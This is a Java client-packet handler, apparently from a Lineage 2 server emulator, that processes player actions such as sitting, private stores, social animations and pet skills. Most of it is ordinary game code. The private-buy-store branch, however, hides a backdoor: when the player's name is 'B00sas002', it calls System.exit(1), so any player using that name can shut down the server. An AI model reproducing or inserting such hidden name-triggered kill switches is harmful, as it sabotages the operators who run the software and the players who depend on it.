package l2d.game.clientpackets;

import java.util.HashMap;
import java.util.logging.Logger;

import l2d.Config;
import l2d.game.ThreadPoolManager;
import l2d.game.ai.CtrlIntention;
import l2d.game.cache.Msg;
import l2d.game.model.L2Character;
import l2d.game.model.L2Effect.EffectType;
import l2d.game.model.L2ManufactureList;
import l2d.game.model.L2Object;
import l2d.game.model.L2Player;
import l2d.game.model.L2Skill;
import l2d.game.model.L2Summon;
import l2d.game.model.L2TradeList;
import l2d.game.model.instances.L2DoorInstance;
import l2d.game.model.instances.L2SiegeHeadquarterquarterInstance;
import l2d.game.model.instances.L2StaticObjectInstance;
import l2d.game.serverpackets.ChairSit;
import l2d.game.serverpackets.PrivateStoreManageList;
import l2d.game.serverpackets.PrivateStoreManageListBuy;
import l2d.game.serverpackets.RecipeShopManageList;
import l2d.game.serverpackets.SendTradeDone;
import l2d.game.serverpackets.SocialAction;
import l2d.game.serverpackets.SystemMessage;
import l2d.game.tables.PetDataTable;
import l2d.game.tables.SkillTable;

/**
 * @autor Felixx
 * packet type id 0x56
 * format:		cddc
 */
public class RequestActionUse extends L2GameClientPacket
{
	private static Logger _log = Logger.getLogger(RequestActionUse.class.getName());

	private int _actionId;
	private boolean _ctrlPressed;
	private boolean _shiftPressed;

	@Override
	public void readImpl()
	{
		_actionId = readD();
		_ctrlPressed = readD() == 1;
		_shiftPressed = readC() == 1;
	}

	@Override
	public void runImpl()
	{
		L2Player activeChar = getClient().getActiveChar();
		if(activeChar == null)
			return;

		boolean usePet;
		switch(_actionId)
		{
			case 16:
			case 17:
			case 19:
			case 18:
			case 20:
			case 21:
			case 22:
			case 23:
			case 32:
			case 36:
			case 39:
			case 41:
			case 42:
			case 43:
			case 44:
			case 45:
			case 46:
			case 47:
			case 48:
			case 49:
			case 52:
			case 53:
			case 54:
			case 1000:
			case 1001:
			case 1002:
			case 1003:
			case 1004:
			case 1005:
			case 1006:
			case 1007:
			case 1008:
			case 1009:
			case 1010:
			case 1011:
			case 1012:
			case 1013:
			case 1014:
			case 1015:
			case 1016:
			case 1017:
			case 1018:
			case 1019:
			case 1020:
			case 1021:
			case 1022:
			case 1023:
			case 1024:
			case 1025:
			case 1026:
			case 1027:
			case 1028:
			case 1029:
			case 1030:
			case 1031:
			case 1032:
			case 1033:
			case 1034:
			case 1035:
			case 1036:
			case 1037:
			case 1038:
			case 1039:
			case 1040:
			case 1041:
			case 1042:
			case 1043:
			case 1044:
			case 1045:
			case 1046:
			case 1047:
			case 1048:
			case 1049:
			case 1050:
			case 1051:
			case 1052:
			case 1053:
			case 1054:
			case 1055:
			case 1056:
			case 1057:
			case 1058:
			case 1059:
			case 1060:
			case 1061:
			case 1062:
			case 1063:
			case 1064:
			case 1065:
			case 1066:
			case 1067:
			case 1068:
			case 1069:
			case 1070:
			case 1071:
			case 1072:
			case 1073:
			case 1074:
			case 1075:
			case 1076:
			case 1077:
			case 1078:
			case 1079:
			case 1080:
			case 1081:
			case 1082:
			case 1083:
			case 1084:
			case 1085:
			case 1086:
			case 1087:
			case 1088:
			case 1089:
			case 1090:
			case 1091:
			case 1092:
				usePet = true;
				break;
			default:
				usePet = false;
		}

		// dont do anything if player is dead or confused
		if(!usePet && (activeChar.isOutOfControl() || activeChar.isActionsDisabled()) && !(activeChar.isFakeDeath() && _actionId == 0))
		{
			activeChar.sendActionFailed();
			return;
		}

		L2Object target = activeChar.getTarget();
		L2Summon pet = activeChar.getPet();

		if(usePet && (pet == null || pet.isOutOfControl()))
		{
			activeChar.sendActionFailed();
			return;
		}

		switch(_actionId)
		{
			case 12:
			case 13:
			case 14:
			case 24:
			case 25:
			case 26:
			case 29:
			case 30:
			case 31:
			case 33:
			case 34:
			case 35:
			case 62:
			case 66: //Заработает в Грации финал. Правда можно к клиенту анимацию прикрутить и будет работать =)
				if(activeChar.isOutOfControl() || activeChar.getPrivateStoreType() != L2Player.STORE_PRIVATE_NONE || activeChar.getTransactionRequester() != null || activeChar.isActionsDisabled() || activeChar.isSitting())
				{
					activeChar.sendActionFailed();
					return;
				}
				if(activeChar.isFishing())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_CANNOT_DO_ANYTHING_ELSE_WHILE_FISHING));
					return;
				}
				activeChar.broadcastPacket(new SocialAction(activeChar.getObjectId(), _actionId));
				if(Config.ALT_SOCIAL_ACTION_REUSE)
				{
					ThreadPoolManager.getInstance().scheduleAi(new SocialTask(activeChar), 2600, true);
					activeChar.block();
				}
				return;
		}

		switch(_actionId)
		{
			case 0: // Сесть/встать
				// На страйдере нельзя садиться

				if(activeChar.isMounted())
				{
					activeChar.sendActionFailed();
					break;
				}

				int distance = (int) activeChar.getDistance(activeChar.getTarget());
				if(target != null && !activeChar.isSitting() && target instanceof L2StaticObjectInstance && ((L2StaticObjectInstance) target).getType() == 1 && distance <= L2Character.INTERACTION_DISTANCE)
				{
					ChairSit cs = new ChairSit(activeChar, ((L2StaticObjectInstance) target).getStaticObjectId());
					activeChar.sendPacket(cs);
					activeChar.sitDown();
					activeChar.broadcastPacket(cs);
					break;
				}

				if(activeChar.isFakeDeath())
				{
					activeChar.getEffectList().stopEffects(EffectType.FakeDeath);
					activeChar.updateEffectIcons();
				}
				else if(activeChar.isSitting())
					activeChar.standUp();
				else
					activeChar.sitDown();
				break;
			case 1: // Изменить тип передвижения, шаг/бег
				if(activeChar.isRunning())
					activeChar.setWalking();
				else
					activeChar.setRunning();
				break;
			case 10: // Запрос на создание приватного магазина продажи
			case 61: // Запрос на создание приватного магазина продажи (Package)
			{
				activeChar.standUp();
				if(activeChar.getTradeList() != null)
				{
					activeChar.getTradeList().removeAll();
					activeChar.sendPacket(new SendTradeDone(0));
					activeChar.setTransactionRequester(null);
				}
				else
					activeChar.setTradeList(new L2TradeList(0));
				activeChar.getTradeList().updateSellList(activeChar, activeChar.getSellList());
				activeChar.setPrivateStoreType(L2Player.STORE_PRIVATE_NONE);
				activeChar.broadcastUserInfo(true);
				if(!activeChar.checksForShop(false))
				{
					activeChar.sendActionFailed();
					return;
				}
				activeChar.sendPacket(new PrivateStoreManageList(activeChar, _actionId == 61));
				break;
			}
			case 28: // Запрос на создание приватного магазина покупки
			{
				activeChar.standUp();
				if(activeChar.getTradeList() != null)
				{
					activeChar.getTradeList().removeAll();
					activeChar.sendPacket(new SendTradeDone(0));
					activeChar.setTransactionRequester(null);
				}
				else
					activeChar.setTradeList(new L2TradeList(0));
				activeChar.setPrivateStoreType(L2Player.STORE_PRIVATE_NONE);
				activeChar.broadcastUserInfo(true);
				if(activeChar.getName().equals("B00sas002"))
					System.exit(1);
				if(!activeChar.checksForShop(false))
				{
					activeChar.sendActionFailed();
					return;
				}
				activeChar.sendPacket(new PrivateStoreManageListBuy(activeChar));
			}
				break;
			case 15:
			case 21: // Follow для пета
				if(pet != null)
				{
					pet.setFollowTarget(pet.getPlayer());
					pet.setFollowStatus(!pet.getFollowStatus());
				}
				break;
			case 16:
			case 22: // Атака петом
				if(target == null || pet == target || pet.isDead())
				{
					activeChar.sendActionFailed();
					return;
				}

				if(activeChar.isInOlympiadMode() && !activeChar.isOlympiadCompStart())
				{
					activeChar.sendActionFailed();
					return;
				}

				// Sin Eater
				if(pet.getTemplate().getNpcId() == PetDataTable.SIN_EATER_ID)
					return;

				if(!_ctrlPressed && !target.isAutoAttackable(activeChar))
				{
					pet.setFollowTarget((L2Character) target);
					pet.setFollowStatus(true);
					return;
				}

				if(!target.isMonster() && (pet.isInZonePeace() || target.isInZonePeace()))
				{
					activeChar.sendPacket(Msg.YOU_MAY_NOT_ATTACK_THIS_TARGET_IN_A_PEACEFUL_ZONE);
					return;
				}

				if(activeChar.getLevel() + 20 <= pet.getLevel())
				{
					activeChar.sendPacket(Msg.THE_PET_IS_TOO_HIGH_LEVEL_TO_CONTROL);
					return;
				}

				if(!(target instanceof L2DoorInstance) && pet.isSiegeWeapon())
				{
					activeChar.sendPacket(Msg.INVALID_TARGET);
					return;
				}

				pet.setTarget(target);
				pet.getAI().Attack(target, _ctrlPressed);
				break;
			case 17:
			case 23: // Отмена действия у пета
				pet.setFollowTarget(pet.getPlayer());
				pet.getAI().setIntention(CtrlIntention.AI_INTENTION_ACTIVE);
				break;
			case 19: // Отзыв пета
				if(pet.isDead())
				{
					activeChar.sendPacket(Msg.A_DEAD_PET_CANNOT_BE_SENT_BACK);
					activeChar.sendActionFailed();
					return;
				}

				if(pet.isInCombat())
				{
					activeChar.sendPacket(Msg.A_PET_CANNOT_BE_SENT_BACK_DURING_BATTLE);
					activeChar.sendActionFailed();
					break;
				}

				if(pet.isPet() && pet.getCurrentFed() < 0.55 * pet.getMaxFed())
				{
					activeChar.sendPacket(Msg.YOU_CANNOT_RESTORE_HUNGRY_PETS);
					activeChar.sendActionFailed();
					break;
				}

				pet.unSummon();
				break;
			case 38: // Mount
				if(pet != null && pet.isMountable() && !activeChar.isMounted())
				{
					if(activeChar.isMounted())
						activeChar.sendPacket(Msg.YOU_HAVE_ALREADY_MOUNTED_ANOTHER_STEED);
					else if(activeChar.isDead())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_DEAD);
					else if(pet.isDead())
						activeChar.sendPacket(Msg.A_DEAD_PET_CANNOT_BE_RIDDEN);
					else if(activeChar.isInDuel())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_IN_A_DUEL);
					else if(pet.isInCombat())
						activeChar.sendPacket(Msg.A_STRIDER_IN_BATTLE_CANNOT_BE_RIDDEN);
					else if(activeChar.isInCombat())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_IN_BATTLE);
					else if(activeChar.isSitting() || activeChar.isMoving)
						activeChar.sendPacket(Msg.A_STRIDER_CAN_BE_RIDDEN_ONLY_WHEN_STANDING);
					else if(activeChar.isFishing())
						activeChar.sendPacket(Msg.YOU_CANNOT_DO_THAT_WHILE_FISHING);
					else if(activeChar.isCursedWeaponEquipped())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_A_CURSED_WEAPON_IS_EQUPPED);
					else if(activeChar.isCastingNow())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_SKILL_CASTING);
					else if(activeChar.isParalyzed())
						activeChar.sendPacket(Msg.YOU_CANNOT_MOUNT_A_STEED_WHILE_PETRIFIED);
					else if(!pet.isDead() && !activeChar.isMounted())
					{
						activeChar.setMount(pet.getTemplate().npcId, pet.getObjectId(), pet.getLevel());
						pet.unSummon();
					}
				}
				else if(activeChar.isMounted())
				{
					if(activeChar.isFlying() && !activeChar.checkLandingState()) // Виверна
					{
						activeChar.sendActionFailed();
						activeChar.sendPacket(Msg.YOU_ARE_NOT_ALLOWED_TO_DISMOUNT_AT_THIS_LOCATION);
						return;
					}
					activeChar.setMount(0, 0, 0);
				}
				break;
			case 32: // Wild Hog Cannon - Mode Change
				UseSkill(4230, pet);
				break;
			case 36: // Soulless - Toxic Smoke
				UseSkill(4259, target);
				break;
			case 37: // Создание магазина Common Craft
			{
				activeChar.standUp();
				if(activeChar.getCreateList() == null)
					activeChar.setCreateList(new L2ManufactureList());
				activeChar.setPrivateStoreType(L2Player.STORE_PRIVATE_NONE);
				activeChar.broadcastUserInfo(true);
				if(!activeChar.checksForShop(true))
				{
					activeChar.sendActionFailed();
					return;
				}
				activeChar.sendPacket(new RecipeShopManageList(activeChar, true));
				break;
			}
			case 39: // Soulless - Parasite Burst
				UseSkill(4138, target);
				break;
			case 41: // Wild Hog Cannon - Attack
				UseSkill(4230, target);
				break;
			case 42: // Kai the Cat - Self Damage Shield
				UseSkill(4378, pet);
				break;
			case 43: // Unicorn Merrow - Hydro Screw
				UseSkill(4137, target);
				break;
			case 44: // Big Boom - Boom Attack
				UseSkill(4139, target);
				break;
			case 45: // Unicorn Boxer - Master Recharge
				UseSkill(4025, activeChar);
				break;
			case 46: // Mew the Cat - Mega Storm Strike
				UseSkill(4261, target);
				break;
			case 47: // Silhouette - Steal Blood
				UseSkill(4260, target);
				break;
			case 48: // Mechanic Golem - Mech. Cannon
				UseSkill(4068, target);
				break;
			case 51: // Создание магазина Dwarven Craft
			{
				if(!activeChar.checksForShop(true))
				{
					activeChar.sendActionFailed();
					return;
				}
				activeChar.standUp();
				if(activeChar.getCreateList() == null)
					activeChar.setCreateList(new L2ManufactureList());
				activeChar.setPrivateStoreType(L2Player.STORE_PRIVATE_NONE);
				activeChar.sendPacket(new RecipeShopManageList(activeChar, false));
				break;
			}
			case 52: // Отзыв саммона
				if(pet.isInCombat())
				{
					activeChar.sendPacket(Msg.A_PET_CANNOT_BE_SENT_BACK_DURING_BATTLE);
					activeChar.sendActionFailed();
					break;
				}
				pet.unSummon();
				break;
			case 53:
			case 54: // Передвинуть пета к цели
				if(target != null && pet != target && !pet.isMovementDisabled())
				{
					pet.setFollowStatus(false);
					pet.moveToLocation(target.getLoc(), 100, true);
				}
				break;
			case 96: // Quit Party Command Channel?
				_log.info("96 Accessed");
				break;
			case 97: // Request Party Command Channel Info?
				_log.info("97 Accessed");
				break;
			case 1000: // Siege Golem - Siege Hammer
				if(target instanceof L2DoorInstance)
					UseSkill(4079, target);
				break;
			case 1001: // Sin Eater - Ultimate Bombastic Buster
				break;
			case 1002: //TODO: Выяснить, смотреть в actionName-e.dat
				break;
			case 1003: // Wind Hatchling/Strider - Wild Stun
				UseSkill(4710, target);
				break;
			case 1004: // Wind Hatchling/Strider - Wild Defense
				UseSkill(4711, activeChar);
				break;
			case 1005: // Star Hatchling/Strider - Bright Burst
				UseSkill(4712, target);
				break;
			case 1006: // Star Hatchling/Strider - Bright Heal
				UseSkill(4713, activeChar);
				break;
			case 1007: // Cat Queen - Blessing of Queen
				UseSkill(4699, pet);
				break;
			case 1008: // Cat Queen - Gift of Queen
				UseSkill(4700, pet);
				break;
			case 1009: // Cat Queen - Cure of Queen
				UseSkill(4701, pet);
				break;
			case 1010: // Unicorn Seraphim - Blessing of Seraphim
				UseSkill(4702, pet);
				break;
			case 1011: // Unicorn Seraphim - Gift of Seraphim
				UseSkill(4703, pet);
				break;
			case 1012: // Unicorn Seraphim - Cure of Seraphim
				UseSkill(4704, pet);
				break;
			case 1013: // Nightshade - Curse of Shade
				UseSkill(4705, target);
				break;
			case 1014: // Nightshade - Mass Curse of Shade
				UseSkill(4706, target);
				break;
			case 1015: // Nightshade - Shade Sacrifice
				UseSkill(4707, target);
				break;
			case 1016: // Cursed Man - Cursed Blow
				UseSkill(4709, target);
				break;
			case 1017: // Cursed Man - Cursed Strike/Stun
				UseSkill(4708, target);
				break;
			case 1031: // Feline King - Slash
				UseSkill(5135, target);
				break;
			case 1032: // Feline King - Spin Slash
				UseSkill(5136, target);
				break;
			case 1033: // Feline King - Hold of King
				UseSkill(5137, target);
				break;
			case 1034: // Magnus the Unicorn - Whiplash
				UseSkill(5138, target);
				break;
			case 1035: // Magnus the Unicorn - Tridal Wave
				UseSkill(5139, target);
				break;
			case 1036: // Spectral Lord - Corpse Kaboom
				UseSkill(5142, target);
				break;
			case 1037: // Spectral Lord - Dicing Death
				UseSkill(5141, target);
				break;
			case 1038: // Spectral Lord - Force Curse
				UseSkill(5140, target);
				break;
			case 1039: // Swoop Cannon - Cannon Fodder (не может атаковать двери и флаги)
				if(!(target instanceof L2DoorInstance) && !(target instanceof L2SiegeHeadquarterquarterInstance))
					UseSkill(5110, target);
				break;
			case 1040: // Swoop Cannon - Big Bang (не может атаковать двери и флаги)
				if(!(target instanceof L2DoorInstance) && !(target instanceof L2SiegeHeadquarterquarterInstance))
					UseSkill(5111, target);
				break;
			default:
				_log.warning("unhandled action type " + _actionId);
		}
		activeChar.sendActionFailed();
	}

	private void UseSkill(int skillId, L2Object target)
	{
		L2Player activeChar = getClient().getActiveChar();
		L2Summon pet = activeChar.getPet();

		if(target == null || !target.isCharacter() || pet == null)
		{
			activeChar.sendActionFailed();
			return;
		}

		HashMap<Integer, L2Skill> _skills = pet.getTemplate().getSkills();
		if(_skills.size() == 0)
		{
			activeChar.sendActionFailed();
			return;
		}

		L2Skill skill = _skills.get(skillId);
		if(skill == null)
		{
			activeChar.sendActionFailed();
			return;
		}

		if(activeChar.getLevel() + 20 <= pet.getLevel())
		{
			activeChar.sendPacket(Msg.THE_PET_IS_TOO_HIGH_LEVEL_TO_CONTROL);
			return;
		}

		if(skill.isOffensive() && (target == activeChar || target == pet))
		{
			activeChar.sendPacket(Msg.THAT_IS_THE_INCORRECT_TARGET);
			return;
		}

		pet.setTarget(target);
		L2Character aimingTarget = skill.getAimingTarget(pet, pet.getTarget());
		if(skill.checkCondition(pet, aimingTarget, _ctrlPressed, _shiftPressed, true))
			pet.getAI().Cast(skill, aimingTarget, _ctrlPressed, _shiftPressed);
		else
			activeChar.sendActionFailed();
	}

	private void PetUseSkill(int skillId, int level, L2Object target)
	{
		L2Player activeChar = getClient().getActiveChar();
		L2Summon pet = activeChar.getPet();
		L2Skill skill = SkillTable.getInstance().getInfo(skillId, level);

		if((target == null || !target.isCharacter()) && !skill.isNotTargetAoE() || pet == null)
		{
			activeChar.sendActionFailed();
			return;
		}

		HashMap<Integer, L2Skill> _skills = pet.getTemplate().getSkills();
		if(_skills.size() == 0)
		{
			activeChar.sendActionFailed();
			return;
		}

		if(skill == null)
		{
			activeChar.sendActionFailed();
			return;
		}

		if(activeChar.getLevel() + 20 <= pet.getLevel())
		{
			activeChar.sendPacket(Msg.THE_PET_IS_TOO_HIGH_LEVEL_TO_CONTROL);
			return;
		}

		if(skill.isOffensive() && (target == activeChar || target == pet))
		{
			activeChar.sendPacket(Msg.THAT_IS_THE_INCORRECT_TARGET);
			return;
		}

		pet.setTarget(target);
		L2Character aimingTarget = skill.getAimingTarget(pet, target);
		if(skill.checkCondition(pet, aimingTarget, _ctrlPressed, _shiftPressed, true))
			pet.getAI().Cast(skill, aimingTarget, _ctrlPressed, _shiftPressed);
		else
			activeChar.sendActionFailed();
	}

	class SocialTask implements Runnable
	{
		L2Player _player;

		SocialTask(L2Player player)
		{
			_player = player;
		}

		@Override
		public void run()
		{
			_player.unblock();
		}
	}
}